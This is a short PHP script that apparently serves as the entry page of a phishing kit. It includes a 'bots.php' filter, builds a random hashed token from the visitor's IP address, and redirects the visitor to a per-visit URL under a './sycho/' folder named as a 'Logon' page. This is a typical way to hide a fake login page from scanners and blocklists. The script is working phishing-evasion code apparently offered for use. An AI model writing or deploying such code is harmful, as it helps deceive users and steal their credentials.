<?php
include 'bots.php';
$random = rand(1000000000,1000000000000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 25);

$Logon="./sycho/?$dst$dst$dst$dst$dst";

header("location: $Logon");
exit;

?>